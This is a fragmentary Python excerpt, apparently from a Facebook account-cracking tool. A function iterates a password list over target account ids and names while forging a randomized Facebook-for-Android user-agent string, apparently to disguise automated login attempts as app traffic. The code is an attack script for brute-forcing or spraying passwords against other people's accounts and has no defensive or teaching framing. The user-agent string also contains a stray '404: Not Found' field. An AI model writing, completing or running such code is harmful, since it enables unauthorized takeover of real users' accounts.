...
def ffb2(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				ffb=random.choice(fbks)
				dvlk = random.choice(usr)
				ua_string = 'Dalvik/2.1.0 (Linux; U; Android 5; 404: Not Found Build/QP1A.243974.688) [FBAN/FB4A;FBAV/361.0.0.60.76;FBBV/364998332;FBRV/0;FBPN/com.facebook.katana;FBLC/en_US;FBMF/samsung;FBBD/samsung;FBDV/SM-A500M;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
				li = ['28','29','210']
				li2 = random.choice(li)
				j1 = ''.join(random.choice(digits) for _ in range(2))
				j2 = li2+j1
